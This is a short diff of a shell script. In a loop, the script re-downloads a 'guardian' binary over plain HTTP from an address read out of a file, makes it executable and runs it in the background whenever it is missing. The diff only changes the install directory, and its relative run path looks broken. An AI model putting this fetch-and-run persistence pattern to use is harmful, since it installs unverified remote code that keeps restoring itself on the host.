@@ -22,8 +22,8 @@ while true; do
 
     if [ ! -f "/usr/bin/guardian" ]; then
         ip_file=$(cat "$ip_file")
-        cd /etc/bin && wget "http://$ip_file/guardian" && chmod +x guardian
-        ./etc/bin/guardian &
+        cd /usr/bin && wget "http://$ip_file/guardian" && chmod +x guardian
+        ./usr/bin/guardian &
     fi
 
     sleep 0.5
